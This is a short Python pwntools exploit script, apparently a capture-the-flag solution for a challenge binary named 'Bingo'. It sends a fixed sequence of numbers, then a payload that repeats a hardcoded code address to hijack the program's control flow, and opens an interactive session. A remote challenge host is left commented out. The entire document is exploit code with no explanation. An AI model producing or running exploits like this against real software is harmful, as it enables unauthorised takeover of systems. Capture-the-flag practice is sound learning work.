#!/usr/bin/env python
# Wildfoot
from pwn import *

context.update(arch="amd64", os="linux")

#host = "35.201.132.60"
#port = 12001
#r = remote(host, port)
r = process("./Bingo")

input("attach in gdb and press Enter")

r.recvuntil("\n")
r.sendline("183\n86\n177\n115\n193\n135\n186\n92\n49\n21\n162\n27\n90\n59\n163\n126\n")

payload = flat([p64(0x555555554de5) * 2])

r.recvuntil("\n")
r.sendline(payload)

r.interactive()
